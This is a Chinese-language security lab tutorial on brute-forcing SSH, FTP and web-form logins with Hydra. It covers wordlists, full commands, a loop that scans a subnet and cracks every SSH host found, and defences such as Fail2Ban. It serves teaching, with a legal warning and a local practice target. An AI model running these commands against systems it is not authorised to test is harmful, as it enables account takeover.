# 🔐 实验01：使用 Hydra 破解密码

> **难度**：⭐⭐ 入门级  
> **预计时间**：30分钟  
> **工具**：Hydra

---

## 🎯 学习目标

通过本实验，你将学会：

- ✅ 理解 Hydra 的工作原理
- ✅ 掌握 Hydra 的基本命令格式
- ✅ 使用 Hydra 对常见服务进行暴力破解
- ✅ 理解暴力破解的防御方法

---

## 📖 背景知识

### 什么是 Hydra？

**Hydra**（九头蛇）是一款非常强大的**在线密码暴力破解工具**，支持多种协议：

| 协议 | 端口 | 说明 |
|------|------|------|
| SSH | 22 | 远程登录 |
| FTP | 21 | 文件传输 |
| HTTP/HTTPS | 80/443 | 网页登录 |
| SMB | 445 | Windows 文件共享 |
| MySQL | 3306 | 数据库 |
| PostgreSQL | 5432 | 数据库 |
| RDP | 3389 | 远程桌面 |
| Telnet | 23 | 远程登录（明文） |

### 工作原理

```
Hydra 工作流程：

1. 读取用户名列表（user.txt）
      ↓
2. 读取密码列表（pass.txt）
      ↓
3. 对每个「用户名:密码」组合，向目标服务发送登录请求
      ↓
4. 根据响应判断登录是否成功
      ↓
5. 输出成功的结果
```

### ⚠️ 法律声明

> **本实验仅供学习使用！**
> - 只能对**自己拥有或授权的系统**进行破解测试
> - 未经授权对他人系统进行暴力破解属于**违法行为**
> - 建议在本地虚拟机或 Docker 靶机环境中练习

---

## 🔧 环境要求

### 系统要求

```bash
# 检查 Hydra 是否已安装
hydra -h

# 如未安装，执行：
sudo apt install -y hydra
```

### 准备靶机（可选但推荐）

为了安全练习，建议启动一个本地靶机：

```bash
# 启动 Metasploitable2 靶机（Docker）
docker run -d -p 22:22 -p 21:21 --name target tleemcjr/metasploitable2

# 靶机 IP（查看 Docker 容器 IP）
docker inspect target | grep IPAddress
```

或者在 Kali 虚拟机内直接扫描本地网络中的弱点主机。

---

## 👨‍💻 实验步骤

### Step 1：了解 Hydra 基本语法

```bash
# 查看帮助
hydra -h

# 基本语法格式
hydra -l <用户名> -p <密码> <目标IP> <服务>
hydra -L <用户名字典> -P <密码字典> <目标IP> <服务>
```

**常用参数说明：**

| 参数 | 说明 | 示例 |
|------|------|------|
| `-l` | 指定单个用户名 | `-l admin` |
| `-L` | 指定用户名字典文件 | `-L users.txt` |
| `-p` | 指定单个密码 | `-p password123` |
| `-P` | 指定密码字典文件 | `-P pass.txt` |
| `-t` | 并发线程数（默认16） | `-t 4` |
| `-v` / `-V` | 显示详细过程 | `-V` |
| `-f` | 找到第一个密码后停止 | `-f` |
| `-s` | 指定非默认端口 | `-s 2222` |
| `-o` | 输出结果到文件 | `-o result.txt` |

---

### Step 2：准备字典文件

```bash
# 创建用户名列表
cat > users.txt << EOF
admin
root
user
test
guest
EOF

# 创建密码列表
cat > pass.txt << EOF
password
password123
123456
admin
root
test
qwerty
letmein
EOF

# 查看字典
cat users.txt
cat pass.txt
```

> 💡 **提示**：实际渗透测试中，字典质量决定成功率。可以使用更完整的字典，如：
> - `/usr/share/wordlists/rockyou.txt`（Kali 自带）
> - `SecLists` 项目：https://github.com/danielmiessler/SecLists

---

### Step 3：对 SSH 服务进行暴力破解

```bash
# 假设目标 IP 是 192.168.1.100，SSH 端口 22
hydra -L users.txt -P pass.txt 192.168.1.100 ssh -t 4 -V

# 如果知道用户名，可以指定单个用户
hydra -l admin -P pass.txt 192.168.1.100 ssh -t 4 -V

# 找到第一个密码后停止
hydra -l admin -P pass.txt 192.168.1.100 ssh -t 4 -f
```

**输出示例：**
```
Hydra v9.4 (c) 2023 by van Hauser/THC - Please do not use in military or secret service environments, this is illegal.

[DATA] attacking ssh://192.168.1.100:22/
[ssh] host: 192.168.1.100   login: admin   password: password123
[ssh] host: 192.168.1.100   login: root    password: root
...
```

---

### Step 4：对 FTP 服务进行暴力破解

```bash
# 破解 FTP
hydra -L users.txt -P pass.txt 192.168.1.100 ftp -t 4 -V

# 指定端口（如果 FTP 不是默认 21 端口）
hydra -L users.txt -P pass.txt 192.168.1.100 ftp -s 2121 -t 4
```

---

### Step 5：对 HTTP 表单登录进行暴力破解

Web 登录表单破解稍微复杂，需要指定 POST 数据和失败特征：

```bash
# 基本格式
hydra -l admin -P pass.txt 192.168.1.100 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Login failed" \
  -V

# 参数说明：
# /login.php          → 登录页面路径
# user=^USER^&pass=^PASS^  → POST 数据，^USER^ 和 ^PASS^ 是占位符
# :Login failed       → 登录失败的提示文字（Hydra 据此判断成功/失败）
```

**实际例子（DVWA 低安全级别）：**

```bash
hydra -l admin -P pass.txt 192.168.1.100 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
  -V
```

---

### Step 6：查看和保存结果

```bash
# 将结果保存到文件
hydra -L users.txt -P pass.txt 192.168.1.100 ssh -t 4 -o result.txt

# 查看结果
cat result.txt
```

---

## ✅ 验证检查

完成实验后，请确认你能回答以下问题：

- [ ] Hydra 的基本命令格式是什么？
- [ ] `-l` 和 `-L` 参数有什么区别？
- [ ] 如何对 Web 登录表单进行暴力破解？
- [ ] Hydra 的并发线程数 `-t` 应该如何设置？太高会有什么问题？

---

## 💡 进阶挑战

### 挑战1：使用 Kali 自带字典

```bash
# 查看 Kali 自带的字典
ls /usr/share/wordlists/

# 使用 rockyou.txt（需要先解压）
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
wc -l /usr/share/wordlists/rockyou.txt   # 查看行数

# 使用大字典进行破解（耗时较长）
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh -t 4
```

### 挑战2：组合攻击

```bash
# 使用 Crunch 生成自定义字典
crunch 6 6 0123456789 -o numbers.txt   # 生成6位数字字典

# 使用自定义字典
hydra -l admin -P numbers.txt 192.168.1.100 ssh -t 4
```

### 挑战3：批量扫描并破解

```bash
# 先使用 Nmap 扫描网段内存活主机
nmap -p 22 192.168.1.0/24 -oG ssh_hosts.txt

# 提取开放 SSH 的主机 IP
grep "22/open" ssh_hosts.txt | cut -d' ' -f2 > ssh_targets.txt

# 对每个目标进行暴力破解（小心被封IP！）
for ip in $(cat ssh_targets.txt); do
  echo "=== 正在破解 $ip ==="
  hydra -l admin -P pass.txt $ip ssh -t 2 -f
done
```

---

## 🛡️ 防御措施（如何防止被 Hydra 破解）

了解攻击方法后，也要知道如何防御：

| 防御措施 | 说明 |
|---------|------|
| **强密码策略** | 使用复杂密码（大小写+数字+符号，长度≥12） |
| **账户锁定** | 失败5次后锁定账户30分钟 |
| **Fail2Ban** | 自动封禁暴力破解的IP |
| **多因素认证（MFA）** | 即使密码被破解也无法登录 |
| **IP 白名单** | 只允许特定IP访问敏感服务 |
| **端口修改** | 修改默认端口（如 SSH 改为 2222） |

### 部署 Fail2Ban 示例

```bash
# 安装
sudo apt install -y fail2ban

# 配置 SSH 保护
sudo cat > /etc/fail2ban/jail.local << EOF
[sshd]
enabled = true
port = ssh
maxretry = 3
bantime = 3600
EOF

# 启动
sudo systemctl enable fail2ban
sudo systemctl start fail2ban

# 查看封禁状态
sudo fail2ban-client status sshd
```

---

## 📚 参考资源

- [Hydra 官方 GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [THC Hydra 使用指南](https://www.hackingarticles.in/comprehensive-guide-on-hydra/)
- [SecLists 字典项目](https://github.com/danielmiessler/SecLists)
- [Fail2Ban 官方文档](https://www.fail2ban.org/)

---

## 📝 实验笔记

> 在这里记录你的实验过程、遇到的问题和解决方案：

```
实验日期：
目标IP：
使用命令：
破解结果：
遇到的问题：
解决方案：
```

---

*最后更新：2026-05-30*
